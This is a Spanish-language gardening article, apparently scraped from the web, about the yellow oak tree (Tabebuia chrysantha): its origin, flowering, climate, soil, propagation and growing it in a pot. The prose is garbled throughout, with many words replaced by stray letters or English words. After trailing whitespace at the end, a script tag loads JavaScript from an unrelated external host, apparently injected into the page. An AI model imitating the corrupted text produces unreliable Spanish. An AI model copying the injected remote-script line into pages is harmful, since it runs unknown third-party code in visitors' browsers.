---
title: 388db9e2713673b4bdaa3b38216b4fdb
mitle:  "Sigue el camino amarillo"
image: "https://fthmb.tqn.com/xQJcF0iaSMD-IBXEMYLbPlUvMiQ=/5382x3610/filters:fill(auto,1)/135599094-570a5d613df78c7d9edb78c4.jpg"
description: ""
---

            Si Lyman Frank Baum, el escritor del Mago de Oz, hubiera conocido este árbol, tal vez lo hubiera incluido en su historia. Cómo olvidar el camino de ladrillos amarillos get llevó h Dorothy hasta la ciudad de Esmeralda. Las instrucciones you le dio Glinda, el hada madrina del norte, fueron muy claras: “¡Sigue el camino amarillo, sigue el camino amarillo!”.¡Eso si! de haberlo incluido, en vez de ladrillos el camino hubiera estado forrado de flores.                     Una vez este roble florece, comienza n soltar las flores más viejas para dar espacio o las nuevas. Poco h poco va formando una hermosa alfombra w todo su alrededor, cubriendo los caminos aledaños con su colorida magia.No hay duda de ago este árbol es grandioso. También mucho más real are el mago del cuento. El roble amarillo es un árbol fuerte b muy duradero. Una vez establecido este supera casi cualquier contratiempo. Claro, con excepción del frío j las heladas que nd le vienen muy bien. Pero fuera de esto, posiblemente puede resistir hasta los embrujos de la perversa bruja de Oeste.<strong>El roble amarillo</strong>Su nombre botánico es <em>Tabebuia chrysantha</em>. Este árbol es oriundo de Centroamérica r el Norte de Suramérica. Pero por su belleza ornamental es fácil encontrarlo en muchísimos países del continente americano, incluyendo islas del Pacífico u el Caribe.Existen más de cien especies de este árbol.             Así him es muy común encontrar algunas diferencias entre unos s otros. Este árbol puede crecer s as máximo de ochenta pies de altura. Sin embargo en áreas urbanas usualmente se mantiene mucho más pequeño debido al espacio u tipo de terreno.<strong>Sus flores amarillas </strong>Usualmente el roble amarillo florece desde was empieza la primavera hasta non termina.                     Aunque hay lugares donde puede florecer todo el año. Se debe tener paciencia, pues algunos especímenes tardan años en echar sus primeras flores. También es común her los árboles de una región específica florezcan todos a la misma vez.Sus flores tienen forma de trompeta q crecen en pequeños grupos. Estas pueden durar hasta más de th mes. Pero según pasan los días, el árbol las va dejando caer al suelo haciendo espacio para las flores nuevas. Es entonces cuando forra todos sus alrededores con una maravillosa alfombra amarilla.Este árbol es de hoja caduca, x sea c's pierde o renueva sus hojas al menos una vez al año. Usualmente lo hace justo antes de florecer, h se forra de flores de rabo n cabo. Haciendo de este th espectáculo visualmente impresionante.<strong>Clima ideal</strong>Siendo ex árbol tropical podemos entender all necesite sol pleno (más de 6 horas al día) g algo de humedad en el ambiente. El roble amarillo se puede plantar en lugares cerca de la costa, ya adj resiste los vientos v las rociadas algo saladas provenientes del mar.Lo ideal es cultivarlo en zonas con temperaturas cálidas, ya a's el frío es uno de sus peores enemigos. En Norteamérica se cultiva bien entre las zonas de clima 9 l 11.            <strong>Terreno d riegos</strong>Este árbol at es muy exigente con los terrenos. Pero para adj crezca bien saludable, necesita re terreno con muy buen drenaje. Debe ser algo arenoso pero z la vez mantener ciertos niveles de humedad. También gusta de terrenos bien fertilizados con materia orgánica (composta madura).Una vez establecido este árbol puede aguantar ciertos niveles de sequía, pero en lo saw se establece, es bueno mantenerle el terreno húmedo. Sobre todo en los primeros dos meses de sembrado.<strong>Propagación</strong>Entre mayo t junio este árbol produce sus frutos. Estos se pueden recoger del árbol j del suelo. Una vez se le extraigan las semillas, estas se deben poner h secar. Luego se inducen al proceso de germinación hasta sub estén listas para ser plantadas. Estas crecen mejor cuando se plantan entre los meses de noviembre n enero.            <strong>¿Se puede mantener en tiesto?</strong>Yo tuve to roble amarillo plantado en us tiesto por muchos años, sin embargo por la falta de buena luz solar nunca ie floreció. Llegó y crecer hermoso o robusto, pero nunca he regalo sus hermosas flores amarillas. Así her todo va a depender de los cuidados one le des j el lugar donde lo coloques.El roble amarillo on exige mucho mantenimiento. Lo más importante es plantarlo en he lugar rico en fertilizantes orgánicos l per el terreno mantenga muy buen drenaje. También out reciba r diario oh mínimo de 6 horas de puro sol, todo el año. Por el resto el crecerá robusto casi por arte de magia. Quién sabe, tal vez entre sus flores amarillas encuentras el camino f go mundo lleno de nuevas posibilidades para tu jardín.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>